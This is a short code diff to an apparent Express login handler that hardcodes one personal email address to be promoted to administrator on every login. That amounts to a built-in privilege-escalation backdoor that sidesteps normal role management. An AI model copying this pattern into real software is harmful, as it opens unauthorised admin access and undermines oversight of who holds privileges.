@@ -101,6 +101,12 @@ router.post('/login', async (req, res) => {
             return res.status(401).json({ message: 'Invalid credentials' });
         }
 
+        // Ensure admin role for specific email
+        if (email === 'phanigdg@gmail.com' && user.role !== 'admin') {
+            user.role = 'admin';
+            await user.save();
+        }
+
         // Generate JWT token
         const token = jwt.sign(
             { userId: user._id },
